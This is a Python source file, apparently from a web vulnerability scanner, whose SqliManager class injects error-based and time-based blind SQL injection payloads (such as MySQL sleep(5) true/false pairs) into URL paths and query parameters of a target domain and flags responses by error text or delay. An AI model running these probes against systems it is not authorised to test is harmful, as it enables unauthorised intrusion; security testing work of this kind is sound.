import urllib.parse as urlparse
from datetime import datetime
from typing import List
import requests
from Managers.CacheManager import CacheManager
from Models.GetRequestDTO import GetRequestDTO
from Models.SqliFoundDTO import SqliFoundDTO, SqliType


class SqliManager:
    def __init__(self, domain, cookies, headers):
        self.domain = domain
        self.cookies = cookies
        self.headers = headers
        self.error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
        self.time_based_payloads = [
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'}]
        self.delay_in_seconds = 5

    def check_get_requests(self, dtos: List[GetRequestDTO]):
        print(f'[{datetime.now().strftime("%H:%M:%S")}]: SqliManager started...')

        cache_manager = CacheManager('SqliManagerResult', self.domain)
        result = cache_manager.get_saved_result()

        if result is None:
            dtos = list(filter(lambda x: 'route' in x.link, dtos))
            result: List[SqliFoundDTO] = []
            for dto in dtos:
                self.check_url(dto, result)
                self.check_get_params(dto, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: SqliManager GET found {len(result)} items')

    def check_url(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):

        parsed = urlparse.urlparse(dto.link)
        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'
        for payload in self.error_based_payloads:
            self.__send_error_based_request(f'{base_url}{payload}', result)

        for payloads in self.time_based_payloads:
            self.__send_time_based_request(f'{base_url}{payloads["TruePld"]}', f'{base_url}{payloads["FalsePld"]}',
                                           result)

    def check_get_params(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.link)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.link.split(query)
            for payloads in self.time_based_payloads:
                time_based_payloads_urls.add(
                    (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}'))
            for payload in self.error_based_payloads:
                error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, result)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads[0], payloads[1], result)

    def __send_error_based_request(self, url, result: List[SqliFoundDTO]):
        try:
            response = requests.get(url, headers=self.headers, cookies=self.cookies)
            if response.status_code == 200 or str(response.status_code)[0] == '5':
                if not response.history or response.history[0].status_code != 301:
                    web_page = response.text.lower()
                    if 'syntax' in web_page or 'xapikeypoc' in web_page:
                        print(f"SQLiManager ({response.status_code}): - " + url)
                        result.append(SqliFoundDTO(url, SqliType.ERROR))
        except Exception as inst:
            print(inst)
            print("ERROR - " + url)

    def __send_time_based_request(self, truePayload, falsePayload, result: List[SqliFoundDTO]):

        try:
            response1 = requests.get(truePayload, headers=self.headers, cookies=self.cookies)
            if response1.elapsed.total_seconds() >= self.delay_in_seconds:
                response2 = requests.get(falsePayload, headers=self.headers, cookies=self.cookies)
                if response2.elapsed.total_seconds() < self.delay_in_seconds:
                    print(f"SQLiManager delay FOUND: - {truePayload} - {falsePayload}")
                    return result.append(SqliFoundDTO(truePayload, SqliType.TIME))
        except Exception as inst:
            print(inst)
            print("ERROR - " + truePayload)
